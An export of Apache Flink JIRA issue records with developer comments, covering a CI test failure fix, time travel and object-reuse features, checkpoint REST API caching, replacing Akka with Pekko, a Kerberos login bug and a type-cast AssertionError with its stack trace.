https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=50611&view=logs&j=0da23115-68bb-5dcd-192c-bd4c8adebde1&t=24c3384f-1bcb-57b3-224f-51bf973bbee8&l=8613",,,,,,,,,,,,,,,,,,,,FLINK-32487,FLINK-32411,FLINK-32316,FLINK-32495,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Jun 30 12:16:05 UTC 2023,,,,,,,,,,"0|z1iv5c:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"29/Jun/23 06:18;Feifan Wang;https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=50623&view=logs&j=0da23115-68bb-5dcd-192c-bd4c8adebde1&t=24c3384f-1bcb-57b3-224f-51bf973bbee8&l=8168;;;","29/Jun/23 06:36;fanrui;All of Flink master, release-1.16 and release-1.17 have this bug, sorry for causing this problem.

I'm fixing it with high priority.;;;","29/Jun/23 10:41;Sergey Nuyanzin;I'm going to upgrade the priority to blocker since all builds on master mirror started to fail now...;;;","29/Jun/23 10:42;Sergey Nuyanzin;https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=50611&view=logs&j=0da23115-68bb-5dcd-192c-bd4c8adebde1&t=24c3384f-1bcb-57b3-224f-51bf973bbee8&l=8613;;;","29/Jun/23 10:42;Sergey Nuyanzin;https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=50612&view=logs&j=0da23115-68bb-5dcd-192c-bd4c8adebde1&t=24c3384f-1bcb-57b3-224f-51bf973bbee8&l=8389;;;","29/Jun/23 10:42;Sergey Nuyanzin;https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=50613&view=logs&j=0da23115-68bb-5dcd-192c-bd4c8adebde1&t=24c3384f-1bcb-57b3-224f-51bf973bbee8&l=8357;;;","29/Jun/23 10:43;Sergey Nuyanzin;https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=50617&view=logs&j=0da23115-68bb-5dcd-192c-bd4c8adebde1&t=24c3384f-1bcb-57b3-224f-51bf973bbee8&l=8541;;;","29/Jun/23 10:43;Sergey Nuyanzin;https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=50619&view=logs&j=0da23115-68bb-5dcd-192c-bd4c8adebde1&t=24c3384f-1bcb-57b3-224f-51bf973bbee8&l=8542;;;","29/Jun/23 10:43;Sergey Nuyanzin;https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=50621&view=logs&j=0da23115-68bb-5dcd-192c-bd4c8adebde1&t=24c3384f-1bcb-57b3-224f-51bf973bbee8&l=8617;;;","29/Jun/23 10:43;Sergey Nuyanzin;https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=50627&view=logs&j=0da23115-68bb-5dcd-192c-bd4c8adebde1&t=24c3384f-1bcb-57b3-224f-51bf973bbee8&l=8368;;;","29/Jun/23 10:44;Sergey Nuyanzin;https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=50643&view=logs&j=0da23115-68bb-5dcd-192c-bd4c8adebde1&t=24c3384f-1bcb-57b3-224f-51bf973bbee8&l=8617;;;","29/Jun/23 13:06;mapohl;https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=50646&view=logs&j=0da23115-68bb-5dcd-192c-bd4c8adebde1&t=24c3384f-1bcb-57b3-224f-51bf973bbee8&l=8095;;;","29/Jun/23 14:38;fanrui;Sorry again for this bug, merged.

<master: 1.18> 210dc81612ddd80abbe46c66322a21c1b38f2000

1.17: a26dfdd44b37a719a2fba2ac8a8a53074332ea74

1.16: 2327a320fd63e3c49838da998e9154a8ac571855;;;","29/Jun/23 17:20;martijnvisser;Looking at https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=50667&view=logs&j=0da23115-68bb-5dcd-192c-bd4c8adebde1&t=24c3384f-1bcb-57b3-224f-51bf973bbee8 I don’t think this is yet fixed [~fanrui];;;","29/Jun/23 20:09;Sergey Nuyanzin;yep, there is another case for 1.17: https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=50668&view=logs&j=a57e0635-3fad-5b08-57c7-a4142d7d6fa9&t=2ef0effc-1da1-50e5-c2bd-aab434b1c5b7&l=9089;;;","30/Jun/23 03:24;fanrui;Hi [~martijnvisser]  [~Sergey Nuyanzin] [~mapohl] 

Sorry it wasn't fully fixed, SourceCoordinatorAlignmentTest.testWatermarkAlignmentWithTwoGroups fails now. I have analyzed it, and created FLINK-32495. Let's follow it there.

BTW, FLINK-32495 doesn't happen every time, I just run CI at master branch before merging. I merged them for master, release-1.16 and release-1.17 after the master CI passed.

I will submit multiple PRs in the future for each release branch, and check all CIs. Try to avoid it in the future.

Sorry again for this mistake.;;;","30/Jun/23 05:34;Sergey Nuyanzin;[~fanrui] thanks for working on this

I wonder whether it is possible to retry ci (for the same commit in PR) 2-3 times in a row to be a bit more sure that this or new related issue doesn't appear?;;;","30/Jun/23 05:56;fanrui;I have submit 3 PRs(master, 1.16, 1.17) for FLINK-32495, their changed are same, and they will run CI 3 times, do you think it's ok? Or do you want to run 3 times for master PR?

BTW, I have run `SourceCoordinatorAlignmentTest.testWatermarkAlignmentWithTwoGroups` on my Local more than 1K times. They are fine now with FLINK-32495.

You can check the test at this [comment|https://issues.apache.org/jira/browse/FLINK-32495?focusedCommentId=17738873&page=com.atlassian.jira.plugin.system.issuetabpanels%3Acomment-tabpanel#comment-17738873].;;;","30/Jun/23 06:05;Sergey Nuyanzin;yes, my initial idea was about master

thanks, i will have a look

UPD:

{quote}
 I have submit 3 PRs(master, 1.16, 1.17) for FLINK-32495, their changed are same, and they will run CI 3 times
{quote}
IMHO I don't think we can treat them as same ci runs at least because it's not cherry pick (changes are not identical)

 ;;;","30/Jun/23 06:21;taoran;[~fanrui] hi. ci got this problem again.

https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=50662&view=logs&j=0da23115-68bb-5dcd-192c-bd4c8adebde1&t=24c3384f-1bcb-57b3-224f-51bf973bbee8&l=8617;;;","30/Jun/23 06:45;martijnvisser;You can always check https://dev.azure.com/apache-flink/apache-flink/_build?definitionId=1&_a=summary for the overview of all PRs that have been merged into master/release branches for an indication if the problem has been resolved. ;;;","30/Jun/23 08:19;fanrui;{quote} I don't think we can treat them as same ci runs at least because it's not cherry pick (changes are not identical)
{quote}
Actually, the first commit of them are cherry pick. I developed the master commit, and cherry pick to 1.16 and 1.17.

Also, I added a limitation for master PR based on this bug.

Why do I prefer to run only 1 time?
 * It blocks all CIs, I want to fix it asap. Each separate CI run takes 4 hours and I'm afraid we won't be able to fix it today.
 * They are cherry pick, 3 different PRs can show whether the problem has been fixed.
 * I run the failed test on my Mac more than 1K times.

Of course, running CI of each PR three times is more robust. If all of you think it's necessary, I will follow it.

 ;;;","30/Jun/23 12:16;martijnvisser;I re-opened this before FLINK-32495 was filed. With that ticket now closed, it looks like all issues are resolved so closing this ticket too. ;;;"
flink-connector-jdbc  Fixed missing words in documentation,FLINK-32477,13541873,,Improvement,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Minor,Fixed,719039737@qq.com,719039737@qq.com,719039737@qq.com,29/Jun/23 02:33,29/Jun/23 09:23,04/Jun/24 20:41,29/Jun/23 09:23,1.17.0,,,,,,,,,,,,,,jdbc-3.2.0,,,,,,Documentation,,,,0,pull-request-available,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"29/Jun/23 02:33;719039737@qq.com;flink-20230629103251.jpg;https://issues.apache.org/jira/secure/attachment/13060949/flink-20230629103251.jpg",,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Jun 29 09:23:02 UTC 2023,,,,,,,,,,"0|z1iv20:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"29/Jun/23 09:23;martijnvisser;Fixed in:

apache/flink-connector-jdbc:main - e3c52a4cc9d20454872f13d61a022188ca220ad9;;;",,,,,,,,,,,,,,,,,,,,,,
Support configuring object-reuse for internal operators,FLINK-32476,13541872,,New Feature,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Minor,,,xuannan,xuannan,29/Jun/23 02:32,26/Sep/23 01:53,04/Jun/24 20:41,,,,,,,,,,,,,,,,,,,,,,Runtime / Task,,,,0,auto-deprioritized-major,pull-request-available,,"Currently, object reuse is disabled by default for streaming jobs in order to prevent unexpected behavior. Object reuse becomes problematic when the upstream operator stores its output while the downstream operator modifies the input.

However, many operators implemented by Flink, such as Flink SQL operators, do not modify the input. This implies that it is safe to reuse the input object in such cases. Therefore, we intend to enable object reuse specifically for operators that do not modify the input.

As the first step, we will focus on the operators implemented within Flink. We will create the FLIP to introduce the API that allows user-defined operators to enable object reuse in the future.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Sep 05 22:35:13 UTC 2023,,,,,,,,,,"0|z1iv1s:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"28/Aug/23 22:35;flink-jira-bot;I am the [Flink Jira Bot|https://github.com/apache/flink-jira-bot/] and I help the community manage its development. I see this issues has been marked as Major but is unassigned and neither itself nor its Sub-Tasks have been updated for 60 days. I have gone ahead and added a ""stale-major"" to the issue"". If this ticket is a Major, please either assign yourself or give an update. Afterwards, please remove the label or in 7 days the issue will be deprioritized.
;;;","05/Sep/23 22:35;flink-jira-bot;This issue was labeled ""stale-major"" 7 days ago and has not received any updates so it is being deprioritized. If this ticket is actually Major, please raise the priority and ask a committer to assign you the issue or revive the public discussion.
;;;",,,,,,,,,,,,,,,,,,,,,
Add doc for time travel,FLINK-32475,13541830,13541827,Sub-task,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,,hackergin,hackergin,28/Jun/23 16:43,06/Sep/23 01:34,04/Jun/24 20:41,06/Sep/23 01:34,,,,,,,,,,,,,,,1.18.0,1.19.0,,,,,,,,,0,pull-request-available,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Sep 01 06:17:49 UTC 2023,,,,,,,,,,"0|z1iusg:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"03/Jul/23 07:24;hackergin;[~luoyuxia] I would like to take this , please assign this task to me.;;;","01/Sep/23 06:17;luoyuxia;master:

9c6b34d089a291be08b51c23634627e451f5936a

release-1.18：

69dd59c59f1411786ffa60305b2fe73693cd14b2;;;",,,,,,,,,,,,,,,,,,,,,
Support time travel in table planner ,FLINK-32474,13541829,13541827,Sub-task,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,hackergin,hackergin,hackergin,28/Jun/23 16:43,21/Jul/23 11:16,04/Jun/24 20:41,21/Jul/23 11:16,,,,,,,,,,,,,,,1.18.0,,,,,,Table SQL / API,,,,0,pull-request-available,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Jul 21 11:16:40 UTC 2023,,,,,,,,,,"0|z1ius8:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"03/Jul/23 07:23;hackergin;[~luoyuxia] I would like to take this , please assign this task to;;;","21/Jul/23 11:16;luoyuxia;master:

410b52a35a1941a6f80c9158bd3ecd439524c3f1;;;",,,,,,,,,,,,,,,,,,,,,
Introduce base interfaces for time travel,FLINK-32473,13541828,13541827,Sub-task,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,hackergin,hackergin,hackergin,28/Jun/23 16:40,11/Jul/23 02:53,04/Jun/24 20:41,04/Jul/23 01:32,,,,,,,,,,,,,,,,,,,,,Table SQL / API,,,,0,pull-request-available,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Jul 04 01:32:03 UTC 2023,,,,,,,,,,"0|z1ius0:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"28/Jun/23 16:44;hackergin;[~luoyuxia]  I would like to take this, please assign this task to me. ;;;","04/Jul/23 01:32;luoyuxia;master:

0be92626ea741c681619896ab86696e1d0bde665

Thanks for the pr.;;;",,,,,,,,,,,,,,,,,,,,,
FLIP-308: Support Time Travel,FLINK-32472,13541827,,New Feature,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,hackergin,hackergin,hackergin,28/Jun/23 16:39,06/Sep/23 01:34,04/Jun/24 20:41,06/Sep/23 01:34,,,,,,,,,,,,,,,1.18.0,,,,,,Table SQL / API,,,,0,,,,Umbrella issue for https://cwiki.apache.org/confluence/display/FLINK/FLIP-308%3A+Support+Time+Travel,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Jul 25 12:04:23 UTC 2023,,,,,,,,,,"0|z1iurs:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"25/Jul/23 11:33;knaufk;[~hackergin] I will mark this feature as finished for Flink 1.18 and assign the fixVersion accordingly. If this is indeed not done for Flink 1.18, please let me know.

;;;","25/Jul/23 12:04;hackergin;[~knaufk]  Sure, the current task only requires completing the documentation, and I will do so as soon as possible.;;;",,,,,,,,,,,,,,,,,,,,,
IS_NOT_NULL can add to SUITABLE_FILTER_TO_PUSH,FLINK-32471,13541811,,Improvement,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Minor,,,grandfisher,grandfisher,28/Jun/23 14:24,03/Oct/23 22:35,04/Jun/24 20:41,,,,,,,,,,,,,,,,,,,,,,Table SQL / Planner,,,,0,auto-deprioritized-major,pull-request-available,,"According to FLINK-31273:

The reason for the error is that other filters conflict with IS_NULL, but in fact it won't conflict with IS_NOT_NULL, because operators in SUITABLE_FILTER_TO_PUSH  such as 'SqlKind.GREATER_THAN'  has an implicit filter 'IS_NOT_NULL' according to SQL Semantics.
 
So we think it is feasible to add  IS_NOT_NULL to the SUITABLE_FILTER_TO_PUSH list.",,,,,,,,,,,,,,,,,,,,,,,,,,,,FLINK-31273,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Oct 03 22:35:10 UTC 2023,,,,,,,,,,"0|z1iuo8:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"30/Jun/23 08:05;337361684@qq.com;Hi, [~grandfisher] .  I agree with you, 'IS_NOT_NULL' is possible to push to left which is semantically equivalent in SQL. You can try to add this type of SqlKind to the SUITABLE_FILTER_TO_PUSH set. Btw, is this a requirement founded while using Flink batch in daily work? Thanks. ;;;","10/Jul/23 07:23;grandfisher;Thanks, [~337361684@qq.com], We do have a batch scene. I will try to add this type of SqlKind to the SUITABLE_FILTER_TO_PUSH set as soon as I solve the compilation problem of flink-scala2.12 with local flink code;;;","27/Jul/23 11:15;grandfisher;HI,[~337361684@qq.com] please review [PR|https://github.com/apache/flink/pull/23088]. ;;;","25/Sep/23 22:35;flink-jira-bot;I am the [Flink Jira Bot|https://github.com/apache/flink-jira-bot/] and I help the community manage its development. I see this issues has been marked as Major but is unassigned and neither itself nor its Sub-Tasks have been updated for 60 days. I have gone ahead and added a ""stale-major"" to the issue"". If this ticket is a Major, please either assign yourself or give an update. Afterwards, please remove the label or in 7 days the issue will be deprioritized.
;;;","03/Oct/23 22:35;flink-jira-bot;This issue was labeled ""stale-major"" 7 days ago and has not received any updates so it is being deprioritized. If this ticket is actually Major, please raise the priority and ask a committer to assign you the issue or revive the public discussion.
;;;",,,,,,,,,,,,,,,,,,
SqlValidateException should be exposed as ValidationException,FLINK-32470,13541800,,Bug,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,twalthr,twalthr,twalthr,28/Jun/23 13:40,28/Jun/23 13:40,04/Jun/24 20:41,,,,,,,,,,,,,,,,,,,,,,Table SQL / API,Table SQL / Planner,,,0,,,,"{{ValidationException}} is the main exception of the Table API and SQL in case the user did something wrong. Most exceptions are wrapped into {{ValidationException}}.

Since the parser module has no access to it, it introduces a custom {{SqlValidateException}}. However, this should not be exposed to users. It should only serve as an intermediate exception that is translated in {{FlinkPlannerImpl#validate}}.

{{SqlParserException}} and {{SqlParserEOFException}} could also be simplified to {{ValidationException}} but at least they are correctly annotated and located in the {{o.a.f.table.api}} package.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-06-28 13:40:35.0,,,,,,,,,,"0|z1iuls:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Improve checkpoint REST APIs for programmatic access,FLINK-32469,13541793,,Improvement,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Done,liangtl,liangtl,liangtl,28/Jun/23 13:23,31/Jul/23 14:54,04/Jun/24 20:41,19/Jul/23 16:27,1.16.2,1.17.1,,,,,,,,,,,,,1.18.0,,,,,,Runtime / REST,,,,1,pull-request-available,,,"*Why*

We want to enable programmatic use of the checkpoints REST API, independent of the Flink dashboard.

Currently, REST APIs that retrieve information relating to a given Flink job passes through the {{{}ExecutionGraphCache{}}}. This means that all these APIs will retrieve stale data depending on the {{{}web.refresh-interval{}}}, which defaults to 3s. For programmatic use of the REST API, we should be able to retrieve the latest / cached version depending on the client (Flink dashboard gets the cached version, other clients get the updated version).

For example, a user might want to use the REST API to retrieve the latest completed checkpoint for a given Flink job. This might be useful when trying to use existing checkpoints as state store when migrating a Flink job from one cluster to another. See Appendix for example.

*What*

This change is about separating out the cache used for the checkpoints REST APIs to a separate cache. This way, a user can set the timeout for the checkpoints cache to 0s (disable cache), without causing much effect on the user experience on the Flink dashboard.

In addition, the checkpoint handlers first retrieve the {{{}ExecutionGraph{}}}, then retrieve the {{CheckpointStatsSnapshot}} from the graph. This is not needed, since the checkpoint handlers only need the {{CheckpointStatsSnapshot.}} This change will mean these handlers retrieve the minimal required information ({{{}CheckpointStatsSnapshot){}}} to construct a reply.

 

*Example use case*

When performing security patching / maintenance of the infrastructure supporting the Flink cluster, we might want to transfer a given Flink job to another cluster, whilst maintaining state. We can do this via the below steps:
 # Old cluster - Select completed checkpoint on existing Flink job
 # Old cluster - Stop the existing Flink job
 # New cluster - Start a new Flink job with selected checkpoint

Step 1 requires us to query the checkpoints REST API for the latest completed checkpoint. With the status quo, we need to wait 3s (or whatever the ExecutionGraphCache expiry may be). This is undesirable because this means the Flink job will have to reprocess data equivalent to 3s / whatever the execution graph cache timeout is.",,,,,,,,,,,,,,,,,,,,,,,FLINK-32662,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed Jul 19 16:27:14 UTC 2023,,,,,,,,,,"0|z1iuk8:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"04/Jul/23 07:48;dmvk;Can you please try to rephrase the title/description/ PR so it's centered around the issue this is trying to solve? I believe the motivation is not to ""simplify the implementation (which is subjective)"" but to provide a better experience by reworking the caching mechanics. It's always easier to reason about things when the goal is clear.;;;","04/Jul/23 12:44;liangtl;Thanks for the review [~dmvk] , Rephrased the wording! Let me know if you have other concerns

 ;;;","19/Jul/23 16:27;dannycranmer;Merged commit [{{7b9b4e5}}|https://github.com/apache/flink/commit/7b9b4e53a59ab8f4f2a99a6e162a794d264f7daf] into master ;;;",,,,,,,,,,,,,,,,,,,,
Replace Akka by Pekko,FLINK-32468,13541779,,Improvement,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Critical,Fixed,chesnay,knaufk,knaufk,28/Jun/23 11:46,25/Apr/24 04:32,04/Jun/24 20:41,25/Jul/23 18:17,,,,,,,,,,,,,,,1.18.0,,,,,,Runtime / Coordination,,,,0,pull-request-available,,,"Akka 2.6.x will not receive security fixes from September 2023 onwards (see https://discuss.lightbend.com/t/2-6-x-maintenance-proposal/9949). 

A mid-term plan to replace Akka is described in FLINK-29281. In the meantime, we suggest to replace Akka by Apache Pekko (incubating), which is a fork of Akka 2.6.x under the Apache 2.0 license. This way - if needed - we at least have the ability to release security fixes ourselves in collaboration with the Pekko community. ",,,,,,,,,,,,,,,,,,,,,,,FLINK-32683,FLINK-32684,FLINK-32678,FLINK-29281,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Jul 25 18:17:23 UTC 2023,,,,,,,,,,"0|z1iuh4:",9223372036854775807,Flink's RPC framework is now based on Apache Pekko instead of Akka. Any Akka dependencies were removed.,,,,,,,,,,,,,,,,,,,"30/Jun/23 08:02;liangtl;Is anyone working actively on this? I am happy to give this a shot if not! [~knaufk] ;;;","30/Jun/23 08:31;chesnay;I've already prepared and testsed all the required changes; just waiting for the Pekko 1.0.0 release to conclude.;;;","30/Jun/23 09:26;liangtl;Okay great! (y);;;","25/Jul/23 18:17;chesnay;master: c8ae39d4ac73f81873e1d8ac37e17c29ae330b23;;;",,,,,,,,,,,,,,,,,,,
Move common RPC utils to rpc-core,FLINK-32467,13541770,13481290,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,chesnay,chesnay,chesnay,28/Jun/23 10:59,30/Jun/23 08:43,04/Jun/24 20:41,30/Jun/23 08:43,,,,,,,,,,,,,,,1.18.0,,,,,,Runtime / RPC,,,,0,pull-request-available,,,The ClassLoadingUtils and CleanupOnCloseRpcSystem classes are useful for any rpc system implementation and should thus be shared.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Jun 30 08:43:36 UTC 2023,,,,,,,,,,"0|z1iuf4:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"30/Jun/23 08:43;chesnay;master: 167d5640b24c7ad08b864df1d271ebae8ba6d9dd;;;",,,,,,,,,,,,,,,,,,,,,,
Invalid input strategy for many functions which allows BINARY strings,FLINK-32466,13541748,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,twalthr,twalthr,twalthr,28/Jun/23 09:35,10/Jul/23 17:12,04/Jun/24 20:41,10/Jul/23 17:12,,,,,,,,,,,,,,,1.18.0,,,,,,Table SQL / Planner,,,,0,pull-request-available,,,"""string"" in SQL terms covers both character strings and binary strings. The author of CONCAT might not have known this. In any case, the code gen instead of the validator fails when executing:

{code}
TableEnvironment t = TableEnvironment.create(EnvironmentSettings.inStreamingMode());
t.createTemporaryView(""t"", t.fromValues(lit(new byte[] {97})));
t.executeSql(""SELECT CONCAT(f0, '-magic') FROM t"").print();
{code}

As future work, we should also allow binary strings.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon Jul 10 17:12:15 UTC 2023,,,,,,,,,,"0|z1iua8:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"28/Jun/23 11:49;twalthr;This bugs affects many functions not only CONCAT. In the PR I went through all functions and synchronized the strategy with the runtime implementation.;;;","10/Jul/23 17:12;twalthr;Merged to master: 4cf2124d71a8dd0595e40f07c2dbcc4c85883b82;;;",,,,,,,,,,,,,,,,,,,,,
KerberosLoginProvider.isLoginPossible does accidental login with keytab,FLINK-32465,13541745,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,gaborgsomogyi,gaborgsomogyi,gaborgsomogyi,28/Jun/23 09:30,28/Jun/23 15:51,04/Jun/24 20:41,28/Jun/23 15:51,1.17.2,1.18.0,,,,,,,,,,,,,1.17.2,1.18.0,,,,,API / Core,,,,0,pull-request-available,,,"In KerberosLoginProvider.isLoginPossible there is a call to UserGroupInformation.getCurrentUser() before principal check (keytab usage). This triggers an accidental login with either kerberos credentials if available, or as the local OS user, based on security settings. This is not problematic most of the time since KerberosLoginProvider.doLogin overwrites the credentials with keytab. The problem hurts however when login fails for whatever reason. Such case the workload is just not starting.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed Jun 28 13:39:12 UTC 2023,,,,,,,,,,"0|z1iu9k:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"28/Jun/23 13:39;gaborgsomogyi;e33875e on master
0472cc1 on release-1.17;;;",,,,,,,,,,,,,,,,,,,,,,
AssertionError when converting between Table and SQL with selection and type cast,FLINK-32464,13541741,,Bug,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Duplicate,,yunfengzhou,yunfengzhou,28/Jun/23 09:09,06/Jul/23 03:57,04/Jun/24 20:41,06/Jul/23 03:57,1.16.1,,,,,,,,,,,,,,,,,,,,Table SQL / API,,,,0,,,,"In an attempt to convert table between Table API and SQL API using the following program


{code:java}
    public static void main(String[] args) {
        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();
        StreamTableEnvironment tEnv = StreamTableEnvironment.create(env);

        Table table = tEnv.fromValues(1, 2, 3);

        tEnv.createTemporaryView(""input_table"", table);
        table = tEnv.sqlQuery(""SELECT MAP[f0, 1] AS f1 from input_table"");

        table = table.select($(""f1"").cast(DataTypes.MAP(DataTypes.INT(), DataTypes.INT())));

        tEnv.createTemporaryView(""input_table_2"", table);
        tEnv.sqlQuery(""SELECT * from input_table_2"");
    }
{code}

The following exception is thrown.


{code}
Exception in thread ""main"" java.lang.AssertionError: Conversion to relational algebra failed to preserve datatypes:
validated type:
RecordType((INTEGER, INTEGER) MAP NOT NULL f1-MAP<INT, INT>) NOT NULL
converted type:
RecordType((INTEGER, INTEGER) MAP f1-MAP<INT, INT>) NOT NULL
rel:
LogicalProject(f1-MAP<INT, INT>=[CAST(MAP($0, 1)):(INTEGER, INTEGER) MAP])
  LogicalValues(tuples=[[{ 1 }, { 2 }, { 3 }]])

	at org.apache.calcite.sql2rel.SqlToRelConverter.checkConvertedType(SqlToRelConverter.java:470)
	at org.apache.calcite.sql2rel.SqlToRelConverter.convertQuery(SqlToRelConverter.java:582)
	at org.apache.flink.table.planner.calcite.FlinkPlannerImpl.org$apache$flink$table$planner$calcite$FlinkPlannerImpl$$rel(FlinkPlannerImpl.scala:215)
	at org.apache.flink.table.planner.calcite.FlinkPlannerImpl.rel(FlinkPlannerImpl.scala:191)
	at org.apache.flink.table.planner.operations.SqlToOperationConverter.toQueryOperation(SqlToOperationConverter.java:1498)
	at org.apache.flink.table.planner.operations.SqlToOperationConverter.convertSqlQuery(SqlToOperationConverter.java:1253)
	at org.apache.flink.table.planner.operations.SqlToOperationConverter.convertValidatedSqlNode(SqlToOperationConverter.java:374)
	at org.apache.flink.table.planner.operations.SqlToOperationConverter.convert(SqlToOperationConverter.java:262)
	at org.apache.flink.table.planner.delegation.ParserImpl.parse(ParserImpl.java:106)
	at org.apache.flink.table.api.internal.TableEnvironmentImpl.sqlQuery(TableEnvironmentImpl.java:703)
	at org.apache.flink.streaming.connectors.redis.RedisSinkITCase.main
{code}

